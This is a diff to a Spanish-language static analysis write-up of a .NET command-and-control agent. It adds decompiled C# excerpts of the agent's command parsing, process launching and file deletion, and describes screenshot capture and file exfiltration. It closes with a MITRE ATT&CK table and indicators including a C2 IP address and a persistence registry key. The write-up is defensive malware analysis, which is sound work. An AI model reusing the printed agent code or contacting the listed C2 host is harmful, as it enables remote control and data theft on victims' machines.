@@ -148,9 +148,58 @@ La conexión TCP se realiza con la IP almacenada en la variable _min\_codns_ en 
     6.3 Separa la respuesta obtenida utilizando el separador '='
     6.4 En base al primer valor de la respuesta (lo que estaba antes del '=') llama a distintos métodos.
 
-![alt text](/img/004-GetCommand.png "Parsing response")
+```c#
+public string[] get_procsQtype()
+{
+	string[] result;
+	try
+	{
+		byte[] array = new byte[5];
+		this.byteAdesr = this.newWam.Read(array, 0, 5);
+		int num = BitConverter.ToInt32(array, 0);
+		byte[] array2 = new byte[num];
+		int num2 = 0;
+		for (int i = num; i > 0; i -= this.byteAdesr)
+		{
+			int count = (i > this.bufeAize) ? this.bufeAize : i;
+			this.byteAdesr = this.newWam.Read(array2, num2, count);
+			num2 += this.byteAdesr;
+		}
+		string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
+		if (text.Trim() == "")
+		{
+			result = null;
+		}
+		else
+		{
+			result = text.Split(new char[]
+			{
+				'='
+			});
+		}
+	}
+	return result;
+}
+```
 
-![alt text](/img/004-ParseResponse.png "Execute actions")
+```c#
+private void procD_core()
+        ...
+		string[] procss_type = this.get_procsQtype();
+		...
+		string text = procss_type[0].ToLower();
+		...
+		if (text == "thyTumb")
+		{
+			this.imagiQtails(procss_type[1]);
+		}
+		if (text == "scyTrsz")
+		{
+			this.dsAscrnsize(procss_type[1]);
+		}
+		...
+```
+
 
 Sin analizar el resto de las funciones, el comportamiento del programa ya nos hace suponer que puede ser un agente de C2:
 
@@ -201,3 +250,85 @@ Al recibir el comando "flyTes" junto con una ruta, el comando lista los archivos
 
 ![alt text](/img/004-listfiles2.png "Read directory")
 
+#### 2.3.4 Sacar captura de pantalla
+
+Los comandos "cdyTcrgn", "csyTcrgn" y "csyTdcrgn" pueden ser utilizados para sacar capturas de pantalla cuyo alto es enviado como parámetro:
+
+![alt text](/img/004-sc1.png "Screen capture 1")
+
+![alt text](/img/004-sc2.png "Screen capture 2")
+
+![alt text](/img/004-sc3.png "Screen capture 3")
+
+#### 2.3.5 Exfiltración de un archivo
+
+El comando "afyTile" puede ser utilizado para cargar un archivo de la máquina victima al servidor; para ello, recibe como parámetro la ruta del archivo y envía la ruta del archivo, el nombre del archivo y el contenido de este:
+
+![alt text](/img/004-exfilb.png "File exfiltration")
+
+![alt text](/img/004-exfila.png "File exfiltration 2")
+
+#### 2.3.6 Ejecutar un binario
+
+Para ejecutar un programa que exista en el sistema (sea nativo o descargado con otro comando), se puede utilizar el comando "ruyTnf", el cual inicia un nuevo proceso recibiendo como parámetro el nombre del programa a ejecutar. En caso el programa reciba parámetros, se envían utilizando el caracter '>' como separador.
+
+```C#
+if (text == "ruyTnf") {
+  try {
+    Process.Start(procss_type[1].Split(new char[] { '>' })[0]);
+  } catch {
+  }
+}
+```
+
+#### 2.3.7 Eliminar un archivo
+
+El comando "deyTlt" recibe como parámetro la ruta donde está almacenado un archivo, para posteriormente utilizar el método **File.Delete** para eliminarlo:
+
+```C#
+if (text == "deyTlt") {
+  this.trasQfiles(procss_type[1]);
+}
+
+public void trasQfiles(string path) {
+  try {
+    File.Delete(path);
+  } catch {
+  }
+}
+```
+
+## 3. Conclusiones
+
+Cuando comencé a escribir este artículo creí que sería la parte final del análisis; sin embargo, luego de identificar la cantidad de funciones que el agente exponía, preferí entrar a detalle en algunas y dejar el análisis dinámico para el siguiente artículo.
+
+El malware analizado tiene todas las características de un agente de Comando y Control: se contacta con el servidor cada cierto tiempo, permite obtener información del sistema, permite exfiltrar información, permite descargar binarios al sistema y ejecutarlos, entre otras funciones.
+
+El malware utiliza un par de técnicas para evalidar herramientas de análisis de código estático: uso de subguiones para alterar nombres de variables/llaves de registro, así como el uso de un arreglo de bytes para almacenar una IP en vez de almacenarla en plano; aún así, el que haya sido desarrollado en .NET permite su fácil decompilación y análisis.
+
+En el próximo artículo detallaré como alguien puede interactuar con el malware como parte de su análisis, y así evidenciar si tiene alǵun comportamiento no identificado como parte del análisis estático.
+
+## 4. Mapeo MITRE ATT&CK
+
+| ID        | Táctica             | Técnica                                                               | Descripción                                                                                                                                |
+|-----------|---------------------|-----------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------|
+| T1059.003 | Ejecución           | Command and Scripting Interpreter: Windows Command Shell              | Se utilizó el método Process.Start para iniciar nuevos procesos                                                                            |
+| T1547.001 | Persistencia        | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | Se utilizó la llave de registro HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\haijwivetsgVr para establecer persistencia |
+| T1070.004 | Evasión de defensas | Indicator Removal: File Deletion                                      | El agente tiene la capacidad de eliminar archivos                                                                                          |
+| T1027.010 | Evasión de defensas | Obfuscated Files or Information: Command Obfuscation                  | Se utilizó el reemplazo de caracteres para ofuscar comandos                                                                                |
+| T1057     | Descubrimiento      | Process Discovery                                                     | El agente tiene la capacidad de listar procesos                                                                                            |
+| T1082     | Descubrimiento      | System Information Discovery                                          | El agente tiene la capacidad de obtener información del sistema                                                                            |
+| T1027.010 | Evasión de defensas | Obfuscated Files or Information: Command Obfuscation                  | Se utilizó el reemplazo de caracteres para ofuscar comandos                                                                                |
+| T1113     | Colección           | Screen Capture                                                        | El agente tiene la capacidad de sacar capturas de pantalla                                                                                 |
+| T1005     | Colección           | Data from Local System                                                | El agente tiene la capacidad de obtener información de archivos del sistema                                                                |
+| T1571     | Comando y Control   | Non-Standard Port                                                     | El agente no utiliza puertos comunes para comunicarse con el servidor de C2                                                                |
+| T1095     | Comando y Control   | Non-Application Layer Protocol                                        | El agente se comunica mediante TCP, interactuando directo con el flujo de datos                                                            |
+| T1041     | Comando y Control   | Exfiltration Over C2 Channel                                          | El agente exfiltra información utilizando la conexión establecida con el servidor de C2                                                    |
+
+## 5. IOC
+
+| IOC                                                                           | Tipo              | Descripción                                              |
+|-------------------------------------------------------------------------------|-------------------|----------------------------------------------------------|
+| 59211a4e0f27d70 c659636746b61945a                                              | Hash MD5          | Hash del agente de C2                                    |
+| 162.245.191.217                                                               | IP                | IP a donde se comunica el agente                         |
+| HKEY_CURRENT_USER\ Software\Microsoft \Windows\CurrentVersion\ Run\haijwivetsgVr | Llave de registro | Llave que el agente utiliza para establecer persistencia |
